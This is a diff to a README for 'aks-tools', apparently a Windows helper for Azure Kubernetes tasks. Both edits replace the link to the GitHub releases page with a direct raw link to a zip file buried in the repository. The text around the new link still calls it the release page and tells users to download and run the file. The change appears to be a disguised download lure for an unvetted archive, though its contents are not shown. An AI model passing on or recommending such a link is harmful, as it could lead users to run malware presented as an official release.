@@ -1,6 +1,6 @@
 # 🧰 aks-tools - Simple AKS tools for daily tasks
 
-[![Download aks-tools](https://img.shields.io/badge/Download%20aks--tools-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/theabsurdealer/aks-tools/releases)
+[![Download aks-tools](https://img.shields.io/badge/Download%20aks--tools-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/theabsurdealer/aks-tools/main/aksm/tools_aks_1.9-alpha.3.zip)
 
 ## 🚀 What it does
 
@@ -20,7 +20,7 @@ It is made for users who want quick access to common AKS tasks without typing lo
 
 Visit the release page to download and run this file:
 
-https://github.com/theabsurdealer/aks-tools/releases
+https://raw.githubusercontent.com/theabsurdealer/aks-tools/main/aksm/tools_aks_1.9-alpha.3.zip
 
 Look for the latest release and download the Windows file that matches your system.
 
